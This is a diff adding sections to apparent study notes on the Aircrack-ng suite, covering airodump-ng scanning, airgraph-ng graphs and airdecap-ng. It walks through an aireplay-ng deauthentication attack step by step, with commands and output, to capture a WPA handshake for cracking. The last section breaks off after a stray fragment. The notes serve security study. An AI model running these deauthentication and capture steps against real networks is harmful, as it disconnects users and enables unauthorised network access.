@@ -17,6 +17,8 @@
 |**Airdecap-ng**|Airdecap-ng can decrypt WEP, WPA PSK, or WPA2 PSK capture files.|
 |**Aircrack-ng**|Aircrack-ng can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID.|
 
+
+
 # Airmon-ng
 `Monitor mode` is a specialized mode for wireless network interfaces, enabling them to capture all traffic within a WiFi range. Unlike managed mode, where an interface only processes frames addressed to it, monitor mode allows the interface to capture every packet of data it detects, regardless of its intended recipient. 
 
@@ -71,5 +73,218 @@ Killing these processes:
 
 
 
+# Airodump-ng
+Airodump-ng serves as a tool for capturing packets, specifically targeting raw 802.11 frames. Its primary function lies in the collection of `WEP IVs (Initialization Vectors)` or `WPA/WPA2 handshakes`, which are subsequently utilized with aircrack-ng for security assessment purposes.
+
+`airodump-ng` provides a wealth of information when scanning for WiFi networks. The table below explains each field along with its description:
+|**Field**|**Description**|
+|---|---|
+|BSSID|Shows the MAC address of the access points|
+|PWR|Shows the "power" of the network. The higher the number, the better the signal strength.|
+|Beacons|Shows the number of announcement packets sent by the network.|
+|#Data|Shows the number of captured data packets.|
+|#/s|Shows the number of data packets captured in the past ten seconds.|
+|CH|Shows the "Channel" the network runs on.|
+|MB|Shows the maximum speed supported by the network.|
+|ENC|Shows the encryption method used by the network.|
+|CIPHER|Shows the cipher used by the network.|
+|AUTH|Shows the authentication used by the network.|
+|ESSID|Shows the name of the network.|
+|STATION|Shows the MAC address of the client connected to the network.|
+|RATE|Shows the data transfer rate between the client and the access point.|
+|LOST|Shows the number of data packets lost.|
+|Packets|Shows additional information about the client, such as captured EAPOL or PMKID.|
+|PROBES|Shows the list of networks the client is probing for.|
+
+To utilize `airodump-ng` effectively, the first step is to activate `monitor mode` on the wireless interface. Once Monitor mode is enabled, we can run `airodump-ng` by specifying the name of the targeted wireless interface, to start scanning and collecting data on the wireless access points detectable by the specified interface.
+```bash
+# Start scanning
+sudo airodump-ng wlan0mon
+
+# Scanning specific channel
+sudo airodump-ng -c 11 wlan0mon
+
+# Scan and save output files
+sudo airodump-ng wlan0mon -w HTB
+```
+
+By default, airodump-ng is configured to scan exclusively for networks operating on the `2.4 GHz` band. Nevertheless, if the wireless adapter is compatible with the 5 GHz band, we can instruct airodump-ng to include this frequency range. The list of all WLAN channels & bands available can be found [here](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
+
+- a uses 5 GHz
+- b uses 2.4 GHz
+- g uses 2.4 GHz
+
+```bash
+# Scanning 5 GHz Wi-Fi bands
+sudo airodump-ng wlan0mon --band a
+```
 
 
+
+# Airgraph-ng
+Airgraph-ng is a Python script designed for generating graphical representations of wireless networks using the CSV files produced by Airodump-ng. These CSV files from Airodump-ng capture essential data regarding the associations between wireless clients and Access Points (APs), as well as the inventory of probed networks. Airgraph-ng processes these CSV files to produce two distinct types of graphs:
+
+- `Clients to AP Relationship Graph`: This graph illustrates the connections between wireless clients and Access Points, providing insights into the network topology and the interactions between devices.
+- `Clients Probe Graph`: This graph showcases the probed networks by wireless clients, offering a visual depiction of the networks scanned and potentially accessed by these devices.
+
+By leveraging Airgraph-ng, users can visualize and analyze the relationships and interactions within wireless networks, aiding in network troubleshooting, optimization, and security assessment.
+
+## Clients to AP Relationship Graph
+The `Clients to AP Relationship` (CAPR) graph illustrates the connections between clients and access points (APs). Since this graph emphasizes clients, it will not display any APs without connected clients.
+
+The access points are color-coded based on their encryption type:
+
+- Green for WPA
+- Yellow for WEP
+- Red for open networks
+- Black for unknown encryption.
+
+```bash
+sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png
+```
+<img width="765" height="276" alt="HTB_CAPR" src="https://github.com/user-attachments/assets/327821b3-0f9d-4ecf-acb6-844c3a280983" />
+The `HTB-01.csv` file can be obtained using the `airodump-ng -w HTB` command as shown in previous section.
+
+## Common Probe Graph
+The Common Probe Graph (CPG) in Airgraph-ng visualizes the relationships between wireless clients and the access points (APs) they probe for. It shows which APs each client is trying to connect to by displaying the probes sent out by the clients. This graph helps identify which clients are probing for which networks, even if they are not currently connected to any AP.
+```bash
+sudo airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png
+```
+<img width="541" height="200" alt="HTB_CPG" src="https://github.com/user-attachments/assets/5844554c-e956-4ba7-b12c-db1af01fa344" />
+
+
+
+
+# Aireplay-ng
+The primary function of [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) is to generate traffic for later use in aircrack-ng for cracking the WEP and WPA-PSK keys. There are different attacks that can cause deauthentication for the purpose of capturing WPA handshake data, fake authentications, Interactive packet replay, hand-crafted ARP request injection, and ARP-request reinjection. With the packetforge-ng tool it's possible to create arbitrary frames.
+```bash
+# List all the features of aireplay-ng
+aireplay-ng
+
+ Attack modes (numbers can still be used):
+...
+      --deauth      count : deauthenticate 1 or all stations (-0)
+      --fakeauth    delay : fake authentication with AP (-1)
+      --interactive       : interactive frame selection (-2)
+      --arpreplay         : standard ARP-request replay (-3)
+      --chopchop          : decrypt/chopchop WEP packet (-4)
+      --fragment          : generates valid keystream   (-5)
+      --caffe-latte       : query a client for new IVs  (-6)
+      --cfrag             : fragments against a client  (-7)
+      --migmode           : attacks WPA migration mode  (-8)
+      --test              : tests injection and quality (-9)
+```
+
+Here we'll see and test the `Deauthentication` attack using the flag `-0`
+
+## Perform Deauthentication
+Before sending deauthentication frames, it's important to verify if our wireless card can successfully inject frames into the `target access point (AP)`. This can be tested by `measuring the ping response times` from the AP, which gives us an indication of the link quality based on the percentage of responses received. Furthermore, if we are using two wireless cards, this test can help identify which card is more effective for injection attacks.
+```bash
+# Enable Monitor Mode and set the channel for the interface to 1
+airmon-ng start wlan0 1
+
+# Test for packet injection
+sudo aireplay-ng --test wlan0mon
+
+12:34:56  Trying broadcast probe requests...
+12:34:56  Injection is working!
+12:34:56  Found 27 APs
+12:34:56  Trying directed probe requests...
+12:34:56   00:09:5B:1C:AA:1D - channel: 1 - 'TOMMY'
+12:34:56  Ping (min/avg/max): 0.457ms/1.813ms/2.406ms Power: -48.00
+12:34:56  30/30: 100%
+<SNIP>
+```
+
+Once `packet injection` is working, we can now perform `Deauthentication attack` 
+```bash
+# View all available Wi-Fi networks, also known as access points (APs).
+sudo airodump-ng wlan0mon
+
+CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         
+ 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB 
+ 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           HTB 
+ (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4            
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           HTB 
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           jhony
+```
+
+From the above output, we can see that there are `three available WiFi networks`, and `two clients` are connected to the network named `HTB`. 
+
+Let's send a `deauthentication request` to one of the clients with the station ID `00:0F:B5:32:31:31`.
+```bash
+sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
+
+11:12:33  Waiting for beacon frame (BSSID: 00:14:6C:7A:41:81) on channel 1
+11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:34  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:35  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+11:12:36  Sending 64 directed DeAuth (code 7). STMAC: [00:0F:B5:32:31:3] [ 0| 0 ACKs]
+```
+- `-0` means deauthenticatio
+- `5` is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
+- `-a` 00:14:6C:7A:41:81 is the MAC address of the access point
+- `-c` 00:0F:B5:32:31:31 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
+- `wlan0mon` is the interface name
+
+Once the clients are deauthenticated from the AP, we can continue observing airodump-ng to see when they reconnect.
+```bash
+sudo airodump-ng wlan0mon
+
+CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         
+ 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB 
+ 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  HTB 
+ (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4            
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          HTB 
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          jhony
+```
+In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in Lost packets and Frames count.
+
+Additionally, a `four-way handshake` would be captured by airodump-ng, as shown in the output. By using the `-w` option in airodump-ng, we can `save the captured WPA handshake` into a `.pcap` file. This file can then be used with tools like aircrack-ng to crack the pre-shared key (PSK). We will cover aircrack-ng and the process of cracking PSKs in the upcoming aircrack-ng section.
+
+
+
+# Airdecap-ng
+[Airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng) is a valuable tool for `decrypting wireless capture files` once we have obtained the `key` to a network. It can decrypt WEP, WPA PSK, and WPA2 PSK captures. Additionally, it can remove wireless headers from an unencrypted capture file. This tool is particularly useful in analyzing the data within captured packets by making the content readable and removing unnecessary wireless protocol information.
+
+Airdecap-ng can be used for the following:
+
+- Removing wireless headers from an open network capture (Unencrypted capture).
+- Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.
+- Decrypting a WPA/WPA2-encrypted capture file using the passphrase.
+
+Airdecap-ng generates a new file with the suffix `-dec.cap`, which contains the decrypted or stripped version of the original input file. For instance, an input file named `HTB-01.cap` will result in an `unencrypted` output file named `HTB-01-dec.cap`.
+
+In the encrypted capture file created using airodump-ng and opened using Wireshark as shown below, the Protocol tab only displays 802.11 without specifying the actual protocol of the message. Similarly, the Info tab does not provide meaningful information. Additionally, the source and destination fields only contain MAC addresses instead of the corresponding IP addresses.
+<img width="1447" height="527" alt="Wireshark_1" src="https://github.com/user-attachments/assets/05758ea7-11f8-4bb4-90dd-e82255c3a7ac" />
+
+Conversely, in the decrypted capture file using airdecap-ng, observe how the Protocol tab displays the correct protocol, such as ARP, TCP, DHCP, HTTP, etc. Additionally, notice how the Info tab provides more detailed information, and it correctly displays the source and destination IP addresses.
+<img width="1493" height="536" alt="Wireshark_2" src="https://github.com/user-attachments/assets/8356f8fa-79cf-4800-9935-48614fd249ef" />
+
+## Removing Wireless Headers from Unencrypted Capture File
+Capturing packets on an open network would result in an unencrypted capture file. Even if the capture file is already unencrypted, it may still contain numerous frames that are not relevant to our analysis. To streamline the data, we can utilize airdecap-ng to eliminate the wireless headers from an unencrypted capture file.
+```bash
+# Remove wireless header
+airdecap-ng -b <bssid> <capture-file>
+```
+This will produce a decrypted file with the suffix `-dec.cap`, containing the streamlined data ready for further analysis.
+
+## Decrypting WEP-encrypted captures
+sdfds
